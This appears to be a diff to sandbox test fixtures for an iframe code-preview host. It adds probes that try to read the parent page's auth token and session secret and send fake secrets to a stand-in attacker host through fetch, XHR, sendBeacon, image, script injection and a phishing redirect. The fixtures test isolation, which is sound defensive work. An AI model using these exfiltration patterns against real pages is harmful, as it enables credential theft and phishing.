@@ -180,6 +180,26 @@ export default function RuntimeErrorFixture() {
 }
 `;
 
+export const INFINITE_LOOP_FIXTURE_CODE = `import React from 'react';
+
+// Intentional synchronous infinite loop: compiler inserts elapsed check which terminates it after 1000ms
+export default function InfiniteLoopFixture() {
+  while (true) {
+    // Loop terminates via AST compiler guard after 1000ms
+  }
+  return <div>Unreachable loop content</div>;
+}
+`;
+
+export const ASYNC_HANG_FIXTURE_CODE = `import React from 'react';
+
+// Intentional async hang: suspends indefinitely without boundary, triggering host timeout and iframe recreation
+export default function AsyncHangFixture() {
+  throw new Promise(() => {});
+  return <div>Hanging component</div>;
+}
+`;
+
 export const SECURITY_DOM_ESCAPE_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';
 
 export default function SecurityDomEscapeFixture() {
@@ -229,9 +249,11 @@ export const SECURITY_STORAGE_THEFT_FIXTURE_CODE = `import React, { useState, us
 
 export default function SecurityStorageTheftFixture() {
   const [cookieResult, setCookieResult] = useState('Testing cookie...');
-  const [storageResult, setStorageResult] = useState('Testing localStorage...');
+  const [localStorageResult, setLocalStorageResult] = useState('Testing localStorage...');
+  const [sessionStorageResult, setSessionStorageResult] = useState('Testing sessionStorage...');
   const [isCookieBlocked, setIsCookieBlocked] = useState(false);
-  const [isStorageBlocked, setIsStorageBlocked] = useState(false);
+  const [isLocalStorageBlocked, setIsLocalStorageBlocked] = useState(false);
+  const [isSessionStorageBlocked, setIsSessionStorageBlocked] = useState(false);
 
   useEffect(() => {
     // 1. Parent cookie
@@ -248,13 +270,26 @@ export default function SecurityStorageTheftFixture() {
     try {
       const parentStorage = window.parent.localStorage;
       const testItem = parentStorage.getItem('host-auth-token');
-      setStorageResult('SECURITY BREACH: Read parent localStorage: ' + testItem);
-      setIsStorageBlocked(false);
+      setLocalStorageResult('SECURITY BREACH: Read parent localStorage: ' + testItem);
+      setIsLocalStorageBlocked(false);
     } catch (err) {
-      setStorageResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
-      setIsStorageBlocked(true);
+      setLocalStorageResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
+      setIsLocalStorageBlocked(true);
+    }
+
+    // 3. Parent sessionStorage
+    try {
+      const parentSession = window.parent.sessionStorage;
+      const secretItem = parentSession.getItem('host-session-secret');
+      setSessionStorageResult('SECURITY BREACH: Read parent sessionStorage: ' + secretItem);
+      setIsSessionStorageBlocked(false);
+    } catch (err) {
+      setSessionStorageResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
+      setIsSessionStorageBlocked(true);
     }
   }, []);
+
+  const isFullyIsolated = isCookieBlocked && isLocalStorageBlocked && isSessionStorageBlocked;
 
   return (
     <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
@@ -281,18 +316,32 @@ export default function SecurityStorageTheftFixture() {
         <div
           data-testid="storage-probe-result"
           className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
-            isStorageBlocked
+            isLocalStorageBlocked
               ? 'bg-green-50 border-green-300 text-green-800'
               : 'bg-red-50 border-red-300 text-red-800'
           }\`}
         >
-          {storageResult}
+          {localStorageResult}
+        </div>
+      </div>
+
+      <div className="space-y-2">
+        <div className="text-xs font-semibold text-gray-700">SessionStorage Access:</div>
+        <div
+          data-testid="session-storage-probe-result"
+          className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
+            isSessionStorageBlocked
+              ? 'bg-green-50 border-green-300 text-green-800'
+              : 'bg-red-50 border-red-300 text-red-800'
+          }\`}
+        >
+          {sessionStorageResult}
         </div>
       </div>
 
       <div className="text-xs text-gray-500">
         Status: <span data-testid="storage-isolation-status" className="font-bold">
-          {isCookieBlocked && isStorageBlocked ? 'ISOLATED' : 'VULNERABLE'}
+          {isFullyIsolated ? 'ISOLATED' : 'VULNERABLE'}
         </span>
       </div>
     </div>
@@ -303,47 +352,178 @@ export default function SecurityStorageTheftFixture() {
 export const SECURITY_NETWORK_EXFILTRATION_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';
 
 export default function SecurityNetworkExfiltrationFixture() {
-  const [networkResult, setNetworkResult] = useState('Initiating network fetch...');
-  const [isBlocked, setIsBlocked] = useState(false);
+  const [probeResults, setProbeResults] = useState({
+    fetchBlocked: null,
+    xhrBlocked: null,
+    beaconBlocked: null,
+    imageBlocked: null,
+    scriptBlocked: null,
+    topNavBlocked: null,
+  });
 
   useEffect(() => {
+    // Listen for browser CSP security policy violations
+    const handleViolation = (e) => {
+      const uri = (e.blockedURI || '').toLowerCase();
+      const dir = (e.violatedDirective || '').toLowerCase();
+      if (uri.includes('beacon-leak') || dir.includes('connect-src')) {
+        setProbeResults((p) => ({ ...p, beaconBlocked: true }));
+      }
+      if (uri.includes('tracker.png') || dir.includes('img-src')) {
+        setProbeResults((p) => ({ ...p, imageBlocked: true }));
+      }
+      if (uri.includes('remote-script') || dir.includes('script-src')) {
+        setProbeResults((p) => ({ ...p, scriptBlocked: true }));
+      }
+    };
+
+    document.addEventListener('securitypolicyviolation', handleViolation);
+
+    // 1. fetch()
     fetch('https://malicious-exfiltration.example.com/api/steal-tokens', {
       method: 'POST',
       body: JSON.stringify({ leaked: 'secret-token' }),
     })
-      .then((res) => {
-        setNetworkResult('SECURITY BREACH: Network request succeeded with status ' + res.status);
-        setIsBlocked(false);
-      })
-      .catch((err) => {
-        const msg = err && err.message ? err.message : String(err);
-        setNetworkResult('CSP ENFORCED: Blocked outbound network connection (' + msg + ')');
-        setIsBlocked(true);
-      });
+      .then(() => setProbeResults((p) => ({ ...p, fetchBlocked: false })))
+      .catch(() => setProbeResults((p) => ({ ...p, fetchBlocked: true })));
+
+    // 2. XMLHttpRequest
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://malicious-exfiltration.example.com/xhr-leak');
+      xhr.onerror = () => setProbeResults((p) => ({ ...p, xhrBlocked: true }));
+      xhr.onload = () => setProbeResults((p) => ({ ...p, xhrBlocked: false }));
+      xhr.send('data=secret');
+    } catch (_) {
+      setProbeResults((p) => ({ ...p, xhrBlocked: true }));
+    }
+
+    // 3. navigator.sendBeacon
+    try {
+      if (typeof navigator.sendBeacon === 'function') {
+        const sent = navigator.sendBeacon('https://malicious-exfiltration.example.com/beacon-leak', 'beacon=secret');
+        if (!sent) {
+          setProbeResults((p) => ({ ...p, beaconBlocked: true }));
+        }
+      } else {
+        setProbeResults((p) => ({ ...p, beaconBlocked: true }));
+      }
+    } catch (_) {
+      setProbeResults((p) => ({ ...p, beaconBlocked: true }));
+    }
+
+    // 4. Remote Image load
+    try {
+      const img = new Image();
+      img.onload = () => setProbeResults((p) => ({ ...p, imageBlocked: false }));
+      img.onerror = () => setProbeResults((p) => ({ ...p, imageBlocked: true }));
+      img.src = 'https://malicious-exfiltration.example.com/tracker.png?secret=123';
+    } catch (_) {
+      setProbeResults((p) => ({ ...p, imageBlocked: true }));
+    }
+
+    // 5. Remote Script Injection
+    try {
+      const script = document.createElement('script');
+      script.onload = () => setProbeResults((p) => ({ ...p, scriptBlocked: false }));
+      script.onerror = () => setProbeResults((p) => ({ ...p, scriptBlocked: true }));
+      script.src = 'https://malicious-exfiltration.example.com/remote-script.js';
+      document.head.appendChild(script);
+    } catch (_) {
+      setProbeResults((p) => ({ ...p, scriptBlocked: true }));
+    }
+
+    // 6. Top-level Navigation
+    try {
+      if (window.top && window.top !== window) {
+        window.top.location.href = 'https://malicious-exfiltration.example.com/phish';
+        setProbeResults((p) => ({ ...p, topNavBlocked: false }));
+      } else {
+        setProbeResults((p) => ({ ...p, topNavBlocked: true }));
+      }
+    } catch (err) {
+      setProbeResults((p) => ({ ...p, topNavBlocked: true }));
+    }
   }, []);
 
-  return (
-    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
-      <h2 className="text-lg font-bold text-gray-900" data-testid="network-security-title">
-        Outbound Network Access Probe
-      </h2>
-      <p className="text-sm text-gray-600">
-        Tests CSP connect-src 'none' enforcement against outbound HTTP requests.
-      </p>
+  const allResolved =
+    probeResults.fetchBlocked !== null &&
+    probeResults.xhrBlocked !== null &&
+    probeResults.beaconBlocked !== null &&
+    probeResults.imageBlocked !== null &&
+    probeResults.scriptBlocked !== null &&
+    probeResults.topNavBlocked !== null;
 
-      <div
-        data-testid="network-probe-result"
-        className={\`p-3 rounded-md border text-xs font-mono whitespace-pre-wrap \${
-          isBlocked
-            ? 'bg-green-50 border-green-300 text-green-800'
-            : 'bg-red-50 border-red-300 text-red-800'
-        }\`}
-      >
-        {networkResult}
+  const allBlocked =
+    probeResults.fetchBlocked === true &&
+    probeResults.xhrBlocked === true &&
+    probeResults.beaconBlocked === true &&
+    probeResults.imageBlocked === true &&
+    probeResults.scriptBlocked === true &&
+    probeResults.topNavBlocked === true;
+
+  return (
+    <div className="p-6 max-w-lg mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
+      <h2 className="text-lg font-bold text-gray-900" data-testid="network-security-title">
+        Multi-Vector Network & Navigation Exfiltration Probe
+      </h2>
+
+      <div className="space-y-2 text-xs font-mono">
+        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
+          <span>1. Outbound fetch() API:</span>
+          <span data-testid="probe-fetch-status" className={probeResults.fetchBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
+            {probeResults.fetchBlocked === null ? 'PROBING...' : probeResults.fetchBlocked ? 'BLOCKED' : 'BREACHED'}
+          </span>
+        </div>
+
+        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
+          <span>2. XMLHttpRequest (XHR):</span>
+          <span data-testid="probe-xhr-status" className={probeResults.xhrBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
+            {probeResults.xhrBlocked === null ? 'PROBING...' : probeResults.xhrBlocked ? 'BLOCKED' : 'BREACHED'}
+          </span>
+        </div>
+
+        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
+          <span>3. navigator.sendBeacon:</span>
+          <span data-testid="probe-beacon-status" className={probeResults.beaconBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
+            {probeResults.beaconBlocked === null ? 'PROBING...' : probeResults.beaconBlocked ? 'BLOCKED' : 'BREACHED'}
+          </span>
+        </div>
+
+        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
+          <span>4. Remote Image (&lt;img src&gt;):</span>
+          <span data-testid="probe-image-status" className={probeResults.imageBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
+            {probeResults.imageBlocked === null ? 'PROBING...' : probeResults.imageBlocked ? 'BLOCKED' : 'BREACHED'}
+          </span>
+        </div>
+
+        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
+          <span>5. Remote Script Injection:</span>
+          <span data-testid="probe-script-status" className={probeResults.scriptBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
+            {probeResults.scriptBlocked === null ? 'PROBING...' : probeResults.scriptBlocked ? 'BLOCKED' : 'BREACHED'}
+          </span>
+        </div>
+
+        <div className="flex justify-between p-2 rounded bg-gray-50 border border-gray-200">
+          <span>6. Top-Level Navigation:</span>
+          <span data-testid="probe-topnav-status" className={probeResults.topNavBlocked ? 'text-green-700 font-bold' : 'text-red-700 font-bold'}>
+            {probeResults.topNavBlocked === null ? 'PROBING...' : probeResults.topNavBlocked ? 'BLOCKED' : 'BREACHED'}
+          </span>
+        </div>
       </div>
 
-      <div className="text-xs text-gray-500">
-        Network Policy: <span data-testid="network-isolation-status" className="font-bold">{isBlocked ? 'BLOCKED' : 'PERMITTED'}</span>
+      <div className="pt-2 border-t border-gray-200 flex items-center justify-between">
+        <span className="text-xs font-semibold text-gray-700">Composite Exfiltration Boundary:</span>
+        <span
+          data-testid="network-isolation-status"
+          className={\`px-2.5 py-1 rounded text-xs font-mono font-bold \${
+            allResolved && allBlocked
+              ? 'bg-green-100 text-green-800'
+              : 'bg-yellow-100 text-yellow-800'
+          }\`}
+        >
+          {!allResolved ? 'TESTING...' : allBlocked ? 'ALL_EXFILTRATION_BLOCKED' : 'VULNERABILITY_DETECTED'}
+        </span>
       </div>
     </div>
   );
